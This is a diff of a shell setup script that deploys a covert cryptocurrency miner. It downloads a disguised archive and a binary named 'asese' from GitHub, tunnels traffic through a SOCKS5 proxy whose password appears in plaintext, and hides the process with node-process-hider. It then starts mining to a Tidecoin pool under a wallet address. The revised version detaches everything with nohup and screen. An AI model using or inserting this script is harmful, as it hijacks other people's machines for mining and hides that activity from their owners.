@@ -1,19 +1,19 @@
-#!/bin/sh
+nohup apt update && nohup apt -y install nohup sudo wget curl unzip
+nohup sudo apt-get install screen -y
 
-apt update && apt -y install wget curl sudo unzip autoconf git cmake binutils build-essential net-tools screen golang
+nohup sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
 
-sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
+nohup curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
 
-curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
-sudo apt-get install -y nodejs
-sudo apt-get install gcc g++ make
+nohup apt-get install -y nodejs
 
-npm i -g node-process-hider
+nohup npm i -g node-process-hider
 
-sudo ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
-sudo dpkg-reconfigure --frontend noninteractive tzdata
+ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 
-wget https://github.com/Asriytdx/wesharex/raw/main/graphics.tar.gz
+nohup dpkg-reconfigure --frontend noninteractive tzdata
+
+nohup wget https://github.com/Asriytdx/wesharex/raw/main/graphics.tar.gz
 
 tar -xvzf graphics.tar.gz
 
@@ -31,13 +31,14 @@ socks5_password = 9omojnjzsmux
 
 END
 
-./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf >/dev/null &
+./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
 
 sleep .2
 
 ./graftcp/graftcp curl ifconfig.me
 
 echo " "
+
 echo " "
 
 ./graftcp/graftcp wget https://github.com/Asriytdx/wesharex/raw/main/asese
@@ -45,4 +46,4 @@ chmod +x asese
 
 ph add asese
 
-./graftcp/graftcp ./asese -o stratum+tcp://pool.tidecoin.exchange:3032 -u TQLndLcoNimErutg9BEii5NKGrB12tbfFm.MyRig8 --algo yespower --param-n 2048 --param-r 8 --param-key ""
+screen -d -m ./graftcp/graftcp ./asese -o stratum+tcp://pool.tidecoin.exchange:3032 -u TQLndLcoNimErutg9BEii5NKGrB12tbfFm.MyRig8 --algo yespower --param-n 2048 --param-r 8 --param-key ""
